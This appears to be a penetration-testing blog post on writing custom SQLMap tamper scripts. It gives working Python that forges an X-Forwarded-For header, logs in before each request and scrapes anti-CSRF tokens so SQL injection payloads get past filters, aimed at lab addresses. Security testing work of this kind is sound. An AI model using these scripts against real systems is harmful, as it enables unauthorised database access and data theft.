---
layout: post
title: Writing your own SQLMap Tamper Scripts
date: 2023-09-05 11:44 -0400
categories: [Python]
tags: [boilerplate, sqlmap, python, cheat sheet, hacking]
---

I wrote a SQLMap tamper script that helped me out in something that vanilla SQLMap could not. The issue was that in order for a SQL Injection to be possible, the payload needed to bypass a `preg_match()` function check which looked for blacklisted characters. Basically, what I needed to do was insert a newline before the payload, and finish the payload with a number. Enter a tamper script!

This is the boilerplate script to work with, but first don't forget to create an empty `__init__.py` script so sqlmap can properly import your tamper script:

```terminal
$ touch __init__.py
```

Now here's the script to work with:

```python
#!/usr/bin/env python3

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
        This accepts the payload that SQLMap will send to the
        target, then returns the formatted payload
    """

    if payload:
        # Do stuff to the payload here. Probably best to
        # set a new variable and return that once you
        # manipulate it however.
        pass

    return payload
```

To execute, do this:

```terminal
$ sqlmap --tamper tamper_script.py [...]
```

This, along with all the other flags necessary for the request, will execute your tamper script for each SQLMap request sent.

## Explanation

This can be broken down in a few parts.

### Priority

This is local to SQLMap. Essentially whatever you specify in the `__priority__` variable will be used by SQLMap to determine the order in which tamper scripts will be executed. The values are:

- `PRIORITY.LOWEST`
- `PRIORITY.LOWER`
- `PRIORITY.LOW`
- `PRIORITY.NORMAL`
- `PRIORITY.HIGH`
- `PRIORITY.HIGHER`
- `PRIORITY.HIGHEST`

where the highest priority will execute first.

### Dependencies

A majority of the time you will most likely only need to set this to be a function that returns nothing and just issues the `pass` directive. However, I've seen other tamper scripts that call the `singleTimeWarnMessage()` function to specify a warning before using. If you want to do the same, you can do something like this:

```python
# usual python stuff around the above boilerplate tamper script

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("This is a warning from your tamper script!")
```

### **kwargs

From what I can gather, there are 3 different keyword arguments that are passed to each request: `delimiter`, `headers`, and `hints`. For most situations that I've ever seen (or used) with tamper scripts, I've only modified the headers in transit. To accomplish this, you need to first get the headers using the `.get()` builtin, modify the variable, and it will pass the new header onto each request. For example, if I wanted to modify the `X-Forwarded-For:` cookie, I can do this:

```python
def tamper(payload, **kwargs):
    """
        Update each request with forged X-FORWARDED-FOR header
    """
    headers = kwargs.get("headers", {})
    headers["X-FORWARDED-FOR"] = "127.0.0.1"
    return payload
```

## More Actions to Tamper With

Remember that this is python, so you can set up as many functions or general actions you'd like for each request to ensure that you are sending the proper data. Given this, I can do some other fun things, like create an account and pass the cookie to the next page for each payload

### Log In Before SQLi

```python
#!/usr/bin/env python3

import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

CREATE_ACCT_URL = "http://10.20.30.40/login.php"

def dependencies():
    pass

def new_login(URL):
    """
    This will log in and return the PHPSESSID
    """
    data = {"user": "agr0", "pass": "letmein"}
    r = requests.post(URL, data=data)
    return r.cookies.get("PHPSESSID", None)

def tamper(payload, **kwargs):
    """
    This will pass the payload onto the target after it obtains a new PHPSESSID
    """
    if payload:
        new_sess_id = new_login(CREATE_ACCT_URL)
        headers = kwargs.get("headers", {})
        headers["Cookie"] = f"PHPSESSID={new_sess_id}"
    return payload
```

### Bypass Anti-CSRF Token

Yes, there is already a built-in feature with SQLMap that allows you to check for and include a CSRF token, but for the sake of the argument, let's build it ourselves in a tamper script.

```python
#!/usr/bin/env python3

import requests
import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

CSRF_URL = "http://10.20.30.40/form.php"

def dependencies():
    pass

def get_CSRF(URL):
    """
    This will make an initial request to get the CSRF token
    """
    r = requests.post(URL)
    csrf_pull = re.compile(r'<input name="csrf_tok" type="hidden" value="(.*)" />')
    return csrf_pull.search(r.text).group(1)

def tamper(payload, **kwargs):
    """
    This will pass the payload onto the target after it obtains a new PHPSESSID
    """
    if payload:
        csrf = get_CSRF(CSRF_URL)
        payload += f"&csrf_tok={csrf}"
    return payload
```

### Second Order Injections

Sometimes it's not the initial data that returns a valid SQL Injection, but rather data pulled _from the database itself_ that returns a valid SQL Injection. This is known as a Second Order Injection. Honestly I can't do a better writeup than is mentioned at [Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap), so there you go.

## Epilog

As you can see, you can add any number of functions and actions to each and every SQLMap request being sent. There is a lot to cover with SQLMap, but writing your own tamper scripts should be easy (and honestly, better documented. There isn't much to go on out there).